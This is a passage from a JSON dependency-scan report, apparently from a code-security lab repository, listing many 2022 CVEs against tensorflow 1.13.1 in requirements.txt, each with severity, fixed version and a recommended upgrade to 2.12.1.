            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35987 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35987](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35987)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "482811d51a829440846de5f227b0899746845fe9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35934",
          "ruleIndex": 383,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35934 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35934)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "df584eeb20bc20e76f16dd3c0bef11bb3e1e59c0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35972",
          "ruleIndex": 384,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35972 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35972](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35972)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "db4146a5cb7df6e951f44df27555c9ad8f63f49c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36015",
          "ruleIndex": 385,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36015 (severity: low, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36015](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36015)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "571ce0678a446613619eab0eaed0ed9dd63776e7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35971",
          "ruleIndex": 386,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35971 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35971](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35971)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3b0a87b8d9e4bff3602389e95cfd949fc24eb4e7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35985",
          "ruleIndex": 387,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35985 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35985](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35985)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "12d2b65942bdcceaa8c4937b28fa9df63069ac01"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35952",
          "ruleIndex": 388,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35952 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35952](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35952)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3eb2d7eb40398bf32f88f251531c7a5fa7e05d3b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35966",
          "ruleIndex": 389,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35966 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35966](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35966)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8b47918642cd0acbea94e151406bcaac23659e4a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35979",
          "ruleIndex": 390,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35979 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35979](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35979)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "637f45204008e7caea9a1fe02a7e47282a7d0c36"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35992",
          "ruleIndex": 391,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35992 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35992](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35992)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "04e5b9d8897b8c78c69287bad2711a78d684115a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35981",
          "ruleIndex": 392,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35981 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35981](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35981)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d29631fc4cb00025396189d74b35b8452ddf6b0a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35994",
          "ruleIndex": 393,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35994 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35994](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35994)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "540b27fe5d283f45a38297d0c02e8d54043ab360"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36012",
          "ruleIndex": 394,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36012 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36012](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36012)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a6440b2f4ab696767f54bcab60e8fc142791680e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36000",
          "ruleIndex": 395,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36000 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36000](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36000)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "065ac54ea91862e36fc73385fed8ea8b0ca25634"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36002",
          "ruleIndex": 396,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36002 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36002](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36002)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a5a59d9009637e50c1a193af0a7f780d1c6f14ce"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36019",
          "ruleIndex": 397,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36019 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36019](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36019)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fbf8491eaf432738175e71e1bb93c20d2baaaec1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35989",
          "ruleIndex": 398,
          "level": "warning",
          "message": {
